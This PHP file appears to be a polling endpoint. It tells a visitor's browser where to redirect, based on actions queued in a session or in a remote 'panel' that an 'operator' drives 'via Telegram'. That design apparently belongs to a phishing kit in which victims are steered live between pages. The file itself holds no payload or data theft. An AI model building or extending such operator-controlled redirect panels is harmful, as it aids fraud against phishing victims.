<?php
session_start();
require_once __DIR__ . '/panel_bridge.php';
header('Content-Type: application/json');

panelHeartbeat();

$action = $_SESSION['pending_redirect'] ?? null;

if ($action) {
    unset($_SESSION['pending_redirect']);

    $data = null;
    if ($action === 'custom' && isset($_SESSION['custom_data'])) {
        $data = $_SESSION['custom_data'];
        unset($_SESSION['custom_data']);
    }

    session_write_close();

    $response = ['redirect' => $action];
    if ($data) $response['data'] = $data;

    panelSessionAddAction($action, 'Redirect via Telegram', 'operator');
    echo json_encode($response);
    exit;
}

$panelAction = panelGetPendingAction();
if ($panelAction) {
    session_write_close();
    $action = $panelAction['action'];
    $response = ['redirect' => $action];

    if ($action === 'custom' && $panelAction['custom']) {
        $response['data'] = $panelAction['custom'];
    }

    echo json_encode($response);
    exit;
}

session_write_close();
echo json_encode(['redirect' => null]);
